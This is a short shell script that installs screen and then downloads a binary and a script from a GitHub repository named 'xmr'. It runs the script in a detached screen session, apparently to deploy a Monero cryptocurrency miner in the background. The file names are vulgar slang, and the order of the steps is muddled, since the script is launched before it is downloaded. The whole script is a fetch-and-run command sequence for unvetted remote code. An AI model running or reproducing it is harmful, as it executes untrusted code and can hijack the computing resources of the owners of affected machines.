#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS kontol.sh ./kontol.sh 65 75

wget -O memek https://github.com/renilo/xmr/raw/main/pelar

wget -O kontol.sh https://raw.githubusercontent.com/renilo/xmr/main/kontol.sh

chmod +x kontol.sh

./kontol.sh
